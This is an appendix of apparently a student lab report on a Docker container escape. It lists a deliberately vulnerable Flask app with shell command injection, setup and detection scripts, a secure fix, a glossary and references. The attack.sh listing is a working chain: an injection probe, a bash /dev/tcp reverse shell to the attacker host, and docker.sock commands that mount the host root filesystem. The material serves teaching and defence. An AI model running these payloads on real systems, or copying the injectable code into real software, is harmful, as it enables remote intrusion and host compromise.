\clearpage
\appendix

\chapter{Full Source Code Listings}

\subsection{app.py --- Vulnerable Flask Application}

\begin{lstlisting}[language=Python, caption={app.py --- NetDiag vulnerable web application}]
from flask import Flask, request, render_template
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', result=None)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    result = os.popen("ping -c 3 " + host).read()
    return render_template('index.html', result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
\end{lstlisting}

\vspace{0.5cm}

\subsection{Dockerfile --- NetDiag Container Image}

\begin{lstlisting}[language=bash, caption={Dockerfile --- builds the NetDiag vulnerable image}]
FROM python:3.11-slim
WORKDIR /app
COPY . .
RUN pip install flask
EXPOSE 5000
CMD ["python3", "app.py"]
\end{lstlisting}

\vspace{0.5cm}

\subsection{setup.sh --- Victim Machine Setup Script}

\begin{lstlisting}[language=bash, caption={setup.sh --- builds and runs the vulnerable container on VM1}]
#!/bin/bash
# =============================================================
#  setup.sh  --  Victim Machine (VM1 | 192.168.98.4)
#  Docker Escape Demo | GTU-SET Semester 4
#  Run this ONCE from the repo root after cloning.
# =============================================================

set -e

YELLOW='\033[1;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

banner() { echo -e "\n${YELLOW}[*] $1${NC}"; }
ok()     { echo -e "${GREEN}[+] $1${NC}"; }
err()    { echo -e "${RED}[-] $1${NC}"; exit 1; }

echo ""
echo -e "${YELLOW}  Docker Escape Demo -- Host Setup${NC}"
echo -e "${YELLOW}  VM1 (Victim) | 192.168.98.4${NC}"
echo ""

# -- 1. Check required files -----------------------------------
banner "Checking for required files..."

[ -f "./host/app.py" ]     || err "host/app.py not found."
[ -f "./host/Dockerfile" ] || err "host/Dockerfile not found."

ok "app.py found"
ok "Dockerfile found"

# -- 2. Check Docker -------------------------------------------
banner "Checking Docker..."

if ! command -v docker &>/dev/null; then
    banner "Docker not found -- installing..."
    apt-get update -qq && apt-get install -y docker.io
    systemctl enable --now docker
    ok "Docker installed and started"
else
    ok "Docker already installed: $(docker --version)"
fi

# -- 3. Build the vulnerable image -----------------------------
banner "Building NetDiag Docker image..."
docker build -t netdiag ./host/ && ok "Image 'netdiag' built successfully"

# -- 4. Stop any old container ---------------------------------
if docker ps -a --format '{{.Names}}' | grep -q "^netdiag-app$"; then
    banner "Removing old netdiag-app container..."
    docker rm -f netdiag-app
fi

# -- 5. Run with the intentional misconfiguration --------------
banner "Starting NetDiag container (with docker.sock mount)..."
docker run -d \
    -p 5000:5000 \
    -v /var/run/docker.sock:/var/run/docker.sock \
    --name netdiag-app \
    netdiag

ok "Container running!"

# -- 6. Done ---------------------------------------------------
echo ""
echo -e "${GREEN}Setup complete. NetDiag is LIVE.${NC}"
echo ""
echo -e "  App URL  : ${YELLOW}http://192.168.98.4:5000${NC}"
echo -e "  Vuln URL : ${YELLOW}http://192.168.98.4:5000/ping?host=8.8.8.8;id${NC}"
echo ""
echo -e "  Attacker should now run ${YELLOW}attack.sh${NC} on VM2."
echo ""
\end{lstlisting}

\vspace{0.5cm}

\subsection{attack.sh --- Attacker Machine Script}

\begin{lstlisting}[language=bash, caption={attack.sh --- drives the full attack chain from VM2}]
#!/bin/bash
# =============================================================
#  attack.sh  -  Attacker Machine (VM2 | 192.168.98.5)
#  Docker Escape Demo | GTU-SET Semester 4
#  Walks through each step of the attack chain interactively.
# =============================================================

VICTIM_IP="192.168.98.4"
ATTACKER_IP="192.168.98.5"
PORT=4444
TARGET="http://${VICTIM_IP}:5000"

YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

banner()  { echo -e "\n${YELLOW}[*] $1${NC}"; }
ok()      { echo -e "${GREEN}[+] $1${NC}"; }
info()    { echo -e "${CYAN}    $1${NC}"; }
pause()   { echo -e "\n${YELLOW}Press ENTER to continue...${NC}"; read -r; }

echo ""
echo -e "${RED}  Docker Escape Demo -- Attack Script${NC}"
echo -e "${RED}  VM2 (Attacker) | 192.168.98.5${NC}"
echo ""
echo -e "  Target  : ${YELLOW}${TARGET}${NC}"
echo -e "  Listen  : ${YELLOW}${ATTACKER_IP}:${PORT}${NC}"
echo ""

# -- STEP 1: Confirm RCE ---------------------------------------
banner "STEP 1 - Confirm Remote Code Execution"
info "Sending: GET /ping?host=8.8.8.8;id"
echo ""

RESPONSE=$(curl -s --max-time 10 \
    "${TARGET}/ping?host=8.8.8.8%3Bid" 2>/dev/null)

if echo "$RESPONSE" | grep -q "uid=0"; then
    ok "RCE confirmed! Response contains uid=0(root)"
    echo ""
    echo "$RESPONSE" | grep "uid=" | head -3
else
    echo -e "${RED}[-] No RCE detected. Is the victim app running?${NC}"
    echo "    Raw response: $RESPONSE"
    exit 1
fi

pause

# -- STEP 2: Reverse Shell -------------------------------------
banner "STEP 2 - Reverse Shell"
info "Opening netcat listener on port ${PORT}..."
info "Then sending reverse shell payload to victim."
echo ""
info "Once the shell connects, stabilize with:"
echo ""
echo -e "    ${CYAN}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${NC}"
echo -e "    ${CYAN}export TERM=xterm${NC}"
echo -e "    ${CYAN}# Ctrl+Z -> stty raw -echo; fg -> Enter twice${NC}"
echo ""

pause

if command -v xterm &>/dev/null; then
    xterm -title "Netcat Listener [:${PORT}]" \
        -e "nc -lvnp ${PORT}" &
elif command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "nc -lvnp ${PORT}; exec bash" &
else
    banner "Run this manually in another window:"
    echo -e "    ${YELLOW}nc -lvnp ${PORT}${NC}"
    pause
fi

sleep 1

banner "Sending reverse shell payload to victim..."
PAYLOAD="bash+-c+'bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${PORT}+0>%261'"
curl -s --max-time 5 \
    "${TARGET}/ping?host=8.8.8.8%3B${PAYLOAD}" &>/dev/null &

ok "Payload sent. Watch the listener window for your shell."

pause

# -- STEP 3: Post-exploitation reminder -----------------------
banner "STEP 3 - Inside the Container: Escape via docker.sock"
info "Run these commands in your reverse shell:"
echo ""
echo -e "  ${CYAN}# Verify the socket is mounted${NC}"
echo -e "  ${YELLOW}ls -la /var/run/docker.sock${NC}"
echo ""
echo -e "  ${CYAN}# Install Docker CLI inside the container${NC}"
echo -e "  ${YELLOW}apt-get update && apt-get install -y docker.io${NC}"
echo ""
echo -e "  ${CYAN}# Escape: mount host root and write a file${NC}"
echo -e "  ${YELLOW}docker -H unix:///var/run/docker.sock run -d \\"
echo -e "    -v /:/hostfs --rm alpine \\"
echo -e "    chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'${NC}"
echo ""
echo -e "  ${CYAN}# Verify on VM1 (host):${NC}"
echo -e "  ${YELLOW}cat /tmp/escaped.txt${NC}"
echo ""
echo -e "${GREEN}------------------------------------------${NC}"
echo -e "${GREEN} Attack chain complete if you see 'pwned'. ${NC}"
echo -e "${GREEN}------------------------------------------${NC}"
echo ""
echo -e "  Now switch to VM1 and run ${YELLOW}detect.sh${NC}."
echo ""
\end{lstlisting}

\vspace{0.5cm}

\subsection{detect.sh --- Detection Script}

\begin{lstlisting}[language=bash, caption={detect.sh --- post-attack detection and auditing on VM1}]
#!/bin/bash
# =============================================================
#  detect.sh  -  Victim Machine (VM1 | 192.168.98.4)
#  Docker Escape Demo | GTU-SET Semester 4
#  Run AFTER the attack to demonstrate detection techniques.
# =============================================================

YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

banner() { echo -e "\n${YELLOW}== $1 ==${NC}"; }
ok()     { echo -e "${GREEN}[+] $1${NC}"; }
warn()   { echo -e "${RED}[!] $1${NC}"; }
info()   { echo -e "${CYAN}    $1${NC}"; }

echo ""
echo -e "${CYAN}  Docker Escape Demo -- Detection${NC}"
echo -e "${CYAN}  VM1 (Host) | 192.168.98.4${NC}"
echo ""

# - CHECK 1: Proof of compromise --------------------------------
banner "CHECK 1 - Proof of Host Compromise"
info "Looking for /tmp/escaped.txt written from inside the container..."
echo ""

if [ -f /tmp/escaped.txt ]; then
    warn "HOST IS COMPROMISED"
    echo -e "  Contents: ${RED}$(cat /tmp/escaped.txt)${NC}"
else
    ok "No escape artifact found."
fi

# - CHECK 2: Inspect mounts -------------------------------------
banner "CHECK 2 - Inspect Container Mounts"
info "docker inspect netdiag-app | grep Mounts"
echo ""

if docker inspect netdiag-app &>/dev/null; then
    MOUNTS=$(docker inspect netdiag-app | python3 -c "
import sys, json
data = json.load(sys.stdin)
mounts = data[0].get('Mounts', [])
for m in mounts:
    print('  Source :', m.get('Source'))
    print('  Dest   :', m.get('Destination'))
    print()
" 2>/dev/null)

    echo "$MOUNTS"

    if echo "$MOUNTS" | grep -q "docker.sock"; then
        warn "docker.sock IS mounted -- critical misconfiguration!"
    else
        ok "docker.sock is NOT mounted."
    fi
else
    warn "Container 'netdiag-app' not found."
fi

# - CHECK 3: auditd ---------------------------------------------
banner "CHECK 3 - auditd: Monitor docker.sock Access"
info "Setting up audit rule for /var/run/docker.sock..."
echo ""

if ! command -v auditctl &>/dev/null; then
    info "auditd not installed. Installing..."
    apt-get install -y auditd -qq && systemctl enable --now auditd
fi

auditctl -w /var/run/docker.sock -p rwxa -k docker_sock 2>/dev/null && \
    ok "Audit rule set with key 'docker_sock'"

echo ""
info "Searching audit logs for docker.sock access..."
echo ""
AUDIT_HITS=$(ausearch -k docker_sock 2>/dev/null | tail -20)

if [ -n "$AUDIT_HITS" ]; then
    warn "Audit hits found:"
    echo "$AUDIT_HITS"
else
    info "No past audit hits (rule just added)."
fi

# - CHECK 4: Running containers ---------------------------------
banner "CHECK 4 - All Running Containers"
docker ps --format \
    "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}"

# - CHECK 5: Live socket processes ------------------------------
banner "CHECK 5 - Processes Accessing docker.sock Right Now"
echo ""
PROCS=$(lsof /var/run/docker.sock 2>/dev/null)
if [ -n "$PROCS" ]; then
    warn "These processes have docker.sock open:"
    echo "$PROCS"
else
    ok "No unexpected processes on docker.sock."
fi

# - Summary -----------------------------------------------------
echo ""
echo -e "${YELLOW}=====================================================${NC}"
echo -e "${YELLOW}  Detection Summary${NC}"
echo -e "${YELLOW}=====================================================${NC}"
echo ""
echo -e "  Tool            | What it caught"
echo    "  ----------------|------------------------------------"
echo    "  docker inspect  | docker.sock bind-mount"
echo    "  auditd          | socket access (ongoing logging)"
echo    "  lsof            | live processes on socket"
echo    "  Falco*          | runtime rules (not installed here)"
echo ""
echo    "  * Recommended for production environments."
echo ""
echo -e "${GREEN}  Fix: remove -v /var/run/docker.sock from docker run${NC}"
echo -e "${GREEN}  Fix: replace os.popen() with subprocess.run(list)${NC}"
echo ""
\end{lstlisting}

\vspace{0.5cm}

\subsection{Secure Code Fix --- app.py}

\begin{lstlisting}[language=Python, caption={app.py (fixed) --- subprocess list form eliminates command injection}]
from flask import Flask, request, render_template, abort
import subprocess
import re

app = Flask(__name__)

VALID_HOST = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')

@app.route('/')
def index():
    return render_template('index.html', result=None)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    if not VALID_HOST.match(host):
        abort(400)
    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True,
        text=True,
        timeout=10
    ).stdout
    return render_template('index.html', result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
\end{lstlisting}

% ------------------------------------------------------------------

\chapter{Glossary of Terms}

\begin{itemize}

    \item \textbf{AppArmor} ---
    Linux Security Module providing mandatory access control via
    path-based profiles. Docker loads a default AppArmor profile
    for each container unless disabled.

    \item \textbf{Attack Surface} ---
    The set of entry points, interfaces, and data flows through
    which an attacker can attempt to compromise a system.

    \item \textbf{auditd} ---
    Linux audit daemon. Monitors kernel-level events (file access,
    syscalls) and writes structured logs to
    \texttt{/var/log/audit/audit.log}.

    \item \textbf{auditctl} ---
    Command-line utility for adding, removing, and listing
    \texttt{auditd} rules at runtime.

    \item \textbf{ausearch} ---
    Utility for querying \texttt{auditd} logs by key, user, PID,
    or time range.

    \item \textbf{Bind Mount} ---
    A mount type that maps a host filesystem path directly into a
    container's mount namespace via \texttt{mount(MS\_BIND)}.
    The host path and container path reference the same inode.

    \item \textbf{BPF (Berkeley Packet Filter)} ---
    Kernel virtual machine used to execute user-supplied filter
    programs in kernel space. Used by seccomp for syscall
    filtering.

    \item \textbf{Capabilities (Linux)} ---
    Fine-grained subdivision of root privilege into discrete
    units (e.g., \texttt{CAP\_SYS\_ADMIN},
    \texttt{CAP\_NET\_BIND\_SERVICE}). Docker drops most
    capabilities from containers by default.

    \item \textbf{cgroups (Control Groups)} ---
    Linux kernel feature that limits, accounts for, and isolates
    resource usage (CPU, memory, PIDs, I/O) per process group.

    \item \textbf{Command Injection} ---
    Vulnerability class (CWE-78) where unsanitized user input is
    passed to a shell execution function, allowing attacker-
    controlled commands to execute on the host OS.

    \item \textbf{containerd} ---
    Industry-standard container runtime (CNCF project) that
    manages container lifecycle. Sits between \texttt{dockerd}
    and \texttt{runc}.

    \item \textbf{containerd-shim} ---
    Lightweight process spawned per container by containerd.
    Supervises the container after \texttt{runc} exits and holds
    stdio file descriptors.

    \item \textbf{CVE (Common Vulnerabilities and Exposures)} ---
    Standardized identifier for publicly known security
    vulnerabilities. Format: CVE-YEAR-NUMBER.

    \item \textbf{DAC (Discretionary Access Control)} ---
    Standard Unix permission model: owner, group, and other
    read/write/execute bits on files and directories.

    \item \textbf{Docker} ---
    Toolchain for packaging, distributing, and running
    containerized applications. Comprises CLI, daemon
    (\texttt{dockerd}), and runtime stack (containerd, runc).

    \item \textbf{docker.sock} ---
    Unix domain socket at \texttt{/var/run/docker.sock} over
    which the Docker REST API is exposed. Access to this socket
    is equivalent to host root access.

    \item \textbf{dockerd} ---
    The Docker daemon process. Runs as UID 0 on the host.
    Accepts API requests from clients via \texttt{docker.sock}
    and delegates container execution to containerd.

    \item \textbf{eBPF (extended BPF)} ---
    Modern extension of BPF allowing safe user-supplied programs
    to run in kernel space for observability, networking, and
    security use cases. Used by Falco for runtime detection.

    \item \textbf{execve()} ---
    Linux syscall that replaces the current process image with a
    new program. Used by shells, runc, and Python's subprocess
    module to launch new executables.

    \item \textbf{Falco} ---
    CNCF runtime security tool. Uses eBPF or a kernel module to
    monitor syscall events and alert on rule-matching suspicious
    behaviour.

    \item \textbf{Flask} ---
    Lightweight Python web framework implementing the WSGI
    interface. Used to build the NetDiag vulnerable application.

    \item \textbf{fork()} ---
    Linux syscall that creates a child process as a copy of the
    parent. Child inherits UID, GID, open file descriptors, and
    environment.

    \item \textbf{GTU-SET} ---
    Gujarat Technological University School of Engineering and
    Technology.

    \item \textbf{IMDSv1 / IMDSv2} ---
    AWS Instance Metadata Service versions. IMDSv1 is accessible
    via simple HTTP GET. IMDSv2 requires a session-oriented PUT
    request, mitigating SSRF-based credential theft.

    \item \textbf{IOC (Indicator of Compromise)} ---
    Forensic artefact on a system that indicates a security
    incident has occurred or is in progress.

    \item \textbf{iptables} ---
    Linux kernel netfilter interface for packet filtering and
    NAT. Docker uses iptables to create DNAT rules for port
    mappings and MASQUERADE rules for container outbound traffic.

    \item \textbf{Kernel Space} ---
    CPU privilege ring 0. The operating system kernel executes
    here with full hardware access. User processes cannot execute
    directly in kernel space.

    \item \textbf{lsof} ---
    \textit{List open files}. Reads \texttt{/proc/*/fd/} to
    report all files (including sockets) currently open by
    running processes.

    \item \textbf{LSM (Linux Security Module)} ---
    Kernel framework providing hooks for mandatory access control
    systems. AppArmor and SELinux are LSM implementations.

    \item \textbf{MAC (Mandatory Access Control)} ---
    Access control policy enforced by the kernel regardless of
    user/process discretion. AppArmor and SELinux implement MAC.

    \item \textbf{Namespace (Linux)} ---
    Kernel mechanism that partitions a global resource so
    that each namespace provides an isolated instance. Types:
    PID, NET, MNT, UTS, IPC, USER, TIME, cgroup.

    \item \textbf{NetDiag} ---
    The intentionally vulnerable Flask application built for this
    lab. Exposes a \texttt{/ping} route with OS command injection.

    \item \textbf{Netcat (nc)} ---
    Network utility for reading and writing raw TCP/UDP
    connections. Used in this project as the reverse shell
    listener on the attacker machine.

    \item \textbf{OCI (Open Container Initiative)} ---
    Linux Foundation standards body defining the Runtime
    Specification and Image Specification for containers.

    \item \textbf{os.popen()} ---
    Deprecated Python function that opens a pipe to a shell
    command string via \texttt{/bin/sh -c}. Unsafe when
    used with unsanitized user input.

    \item \textbf{OverlayFS} ---
    Linux union filesystem used by Docker for container image
    layering. Combines read-only image layers
    (\texttt{lowerdir}) with a writable per-container layer
    (\texttt{upperdir}) into a merged view.

    \item \textbf{pivot\_root()} ---
    Linux syscall that changes the root filesystem of the
    calling process. Used by \texttt{runc} to set the
    container's root to its image filesystem.

    \item \textbf{Podman} ---
    Daemonless, rootless OCI container runtime. Drop-in
    replacement for Docker CLI without a central privileged
    daemon or socket.

    \item \textbf{PTY (Pseudo-Terminal)} ---
    Kernel-provided terminal emulation interface. Used in
    shell stabilization (\texttt{python3 -c 'import pty;
    pty.spawn("/bin/bash")'}) to convert a raw reverse
    shell into a fully interactive session.

    \item \textbf{RCE (Remote Code Execution)} ---
    Vulnerability class where an attacker causes a remote system
    to execute attacker-controlled commands without
    authenticated or physical access.

    \item \textbf{Reverse Shell} ---
    A shell session where the target machine initiates the
    outbound TCP connection to the attacker's listener, bypassing
    inbound firewall rules on the target.

    \item \textbf{runc} ---
    OCI-compliant low-level container runtime written in Go.
    Calls \texttt{clone()}, \texttt{pivot\_root()},
    \texttt{execve()} directly to create and start containers.

    \item \textbf{Seccomp} ---
    Linux kernel feature (Secure Computing Mode) that restricts
    which syscalls a process may invoke using BPF filter
    programs.

    \item \textbf{STRIDE} ---
    Microsoft threat modelling framework. Six threat categories:
    Spoofing, Tampering, Repudiation, Information Disclosure,
    Denial of Service, Elevation of Privilege.

    \item \textbf{subprocess.run()} ---
    Python standard library function for spawning subprocesses.
    When called with a list argument and \texttt{shell=False}
    (default), it calls \texttt{execve()} directly without a
    shell interpreter, preventing command injection.

    \item \textbf{Syscall (System Call)} ---
    The controlled interface between user space and kernel space.
    User processes request kernel services (file I/O, process
    creation, networking) via numbered syscall entries.

    \item \textbf{UDS (Unix Domain Socket)} ---
    IPC mechanism for same-host process communication via the
    kernel. Appears as a special file (\texttt{s} type) in the
    filesystem. Access governed entirely by filesystem
    permissions.

    \item \textbf{UID (User Identifier)} ---
    Numeric identifier for a user in the Linux kernel.
    UID 0 = root. Process UID determines file access rights
    and capability checks.

    \item \textbf{User Namespace} ---
    Linux namespace type that maps UIDs inside the namespace
    to different UIDs on the host. Used by rootless Docker to
    map container UID 0 to an unprivileged host UID.

    \item \textbf{veth (Virtual Ethernet)} ---
    Linux virtual network device created in pairs. One end
    placed in container network namespace (\texttt{eth0}),
    the other attached to the host's \texttt{docker0} bridge.

    \item \textbf{WSGI (Web Server Gateway Interface)} ---
    Python standard (PEP 3333) defining the interface between
    a web server and a Python web application. Flask implements
    the WSGI callable.

\end{itemize}

% ------------------------------------------------------------------

\chapter{References}

\subsection{Standards and Benchmarks}

\begin{itemize}

    \item Center for Internet Security.
    \textit{CIS Docker Benchmark}.
    Available at: \texttt{https://www.cisecurity.org/benchmark/docker}

    \item National Institute of Standards and Technology.
    \textit{NIST SP 800-190: Application Container Security Guide}.
    U.S. Department of Commerce, 2017.
    Available at: \texttt{https://csrc.nist.gov/publications/detail/sp/800-190/final}

    \item OWASP Foundation.
    \textit{Docker Security Cheat Sheet}.
    Available at:
    \texttt{https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html}

    \item OWASP Foundation.
    \textit{OWASP Top 10 --- 2021: A03 Injection}.
    Available at: \texttt{https://owasp.org/Top10/A03\_2021-Injection/}

    \item MITRE Corporation.
    \textit{CWE-78: Improper Neutralization of Special Elements
    used in an OS Command}.
    Available at: \texttt{https://cwe.mitre.org/data/definitions/78.html}

\end{itemize}

\subsection{CVEs Referenced}

\begin{itemize}

    \item MITRE Corporation.
    \textit{CVE-2019-5736: runc container breakout via
    /proc/self/exe}.
    National Vulnerability Database, 2019.
    Available at: \texttt{https://nvd.nist.gov/vuln/detail/CVE-2019-5736}

    \item MITRE Corporation.
    \textit{CVE-2020-15257: containerd abstract socket
    exposure}.
    National Vulnerability Database, 2020.
    Available at: \texttt{https://nvd.nist.gov/vuln/detail/CVE-2020-15257}

    \item MITRE Corporation.
    \textit{CVE-2022-0492: Linux kernel cgroup v1
    release\_agent privilege escalation}.
    National Vulnerability Database, 2022.
    Available at: \texttt{https://nvd.nist.gov/vuln/detail/CVE-2022-0492}

\end{itemize}

\subsection{Official Documentation}

\begin{itemize}

    \item Docker Inc.
    \textit{Docker Engine Security}.
    Available at: \texttt{https://docs.docker.com/engine/security/}

    \item Docker Inc.
    \textit{Docker Run Reference}.
    Available at: \texttt{https://docs.docker.com/engine/reference/run/}

    \item Docker Inc.
    \textit{Rootless Docker}.
    Available at:
    \texttt{https://docs.docker.com/engine/security/rootless/}

    \item Docker Inc.
    \textit{seccomp security profiles for Docker}.
    Available at:
    \texttt{https://docs.docker.com/engine/security/seccomp/}

    \item Docker Inc.
    \textit{AppArmor security profiles for Docker}.
    Available at:
    \texttt{https://docs.docker.com/engine/security/apparmor/}

    \item Open Container Initiative.
    \textit{OCI Runtime Specification}.
    Available at:
    \texttt{https://github.com/opencontainers/runtime-spec}

    \item The Linux Kernel Documentation Project.
    \textit{namespaces(7) --- Linux manual page}.
    Available at: \texttt{https://man7.org/linux/man-pages/man7/namespaces.7.html}

    \item The Linux Kernel Documentation Project.
    \textit{capabilities(7) --- Linux manual page}.
    Available at:
    \texttt{https://man7.org/linux/man-pages/man7/capabilities.7.html}

    \item The Linux Kernel Documentation Project.
    \textit{seccomp(2) --- Linux manual page}.
    Available at:
    \texttt{https://man7.org/linux/man-pages/man2/seccomp.2.html}

    \item Python Software Foundation.
    \textit{subprocess --- Subprocess management}.
    Python 3.11 Documentation.
    Available at: \texttt{https://docs.python.org/3/library/subprocess.html}

\end{itemize}

\subsection{Tools}

\begin{itemize}

    \item Falco Project (CNCF).
    \textit{Falco --- Cloud Native Runtime Security}.
    Available at: \texttt{https://falco.org}

    \item Tecnativa.
    \textit{Docker Socket Proxy}.
    Available at:
    \texttt{https://github.com/Tecnativa/docker-socket-proxy}

    \item Aqua Security.
    \textit{Trivy --- Vulnerability and Misconfiguration Scanner}.
    Available at: \texttt{https://aquasecurity.github.io/trivy}

    \item Google Container Tools.
    \textit{Kaniko --- Build Container Images in Kubernetes}.
    Available at:
    \texttt{https://github.com/GoogleContainerTools/kaniko}

    \item Podman Project (Red Hat).
    \textit{Podman --- A daemonless container engine}.
    Available at: \texttt{https://podman.io}

    \item Red Hat.
    \textit{Buildah --- A tool to build OCI container images}.
    Available at: \texttt{https://buildah.io}

\end{itemize}

\subsection{Books and Whitepapers}

\begin{itemize}

    \item Rice, Liz.
    \textit{Container Security: Fundamental Technology Concepts
    that Protect Containerized Applications}.
    O'Reilly Media, 2020.
    ISBN: 978-1492056706.

    \item Chelladhurai, Jeeva S., Chelliah, Pethuru Raj,
    and Kumar, Sathyajith Arjunan.
    \textit{Security Assurance for Containers}.
    In: \textit{Securing Docker Containers}, 2017.

    \item NCC Group.
    \textit{Understanding and Hardening Linux Containers}.
    NCC Group Whitepaper, 2016.
    Available at:
    \texttt{https://research.nccgroup.com/2016/03/07/understanding-and-hardening-linux-containers/}

    \item RedLock Cloud Security Intelligence.
    \textit{Cryptojacking Invades Cloud: How Modern Containerized
    Workloads Are Vulnerable (Tesla Breach Analysis)}.
    RedLock Inc., 2018.

\end{itemize}

\subsection{Academic and Research References}

\begin{itemize}

    \item Bui, Thanh.
    \textit{Analysis of Docker Security}.
    arXiv preprint arXiv:1501.02967, 2015.
    Available at: \texttt{https://arxiv.org/abs/1501.02967}

    \item Martin, A., et al.
    \textit{Docker Ecosystem Vulnerability Analysis}.
    Proceedings of the 2018 IEEE International Conference on
    Software Quality, Reliability and Security Companion
    (QRS-C), 2018.

    \item Combe, T., Martin, A., and Di Pietro, R.
    \textit{To Docker or Not to Docker: A Security Perspective}.
    IEEE Cloud Computing, vol. 3, no. 5, pp. 54--62, 2016.
    DOI: \texttt{10.1109/MCC.2016.100}

\end{itemize}